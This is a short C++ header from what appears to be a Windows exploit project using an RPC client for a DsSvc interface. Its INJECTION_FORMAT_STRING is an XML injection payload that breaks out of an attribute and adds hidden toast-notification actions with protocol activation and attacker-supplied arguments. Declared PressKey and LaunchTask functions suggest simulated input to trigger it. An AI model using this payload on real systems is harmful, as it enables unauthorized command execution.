#pragma once
#include "RPC-Lib/Utils.h"
#include <iostream>
#include <servprov.h>
#include "DsSvc_h.h"

wstring g_Command;
wstring g_SharedFilePath;
const wstring INJECTION_FORMAT_STRING = LR"(MYTOKEN" placement="contextMenu" content="Hidden Button"/>
                <action id="3" activationType="Protocol" arguments="%ws" content="OpenTrace"/>
                <action id="4" activationType="Protocol" placement="contextMenu" arguments="%ws)";

void PressKey(WORD vk, bool keyDown);
void LaunchTask();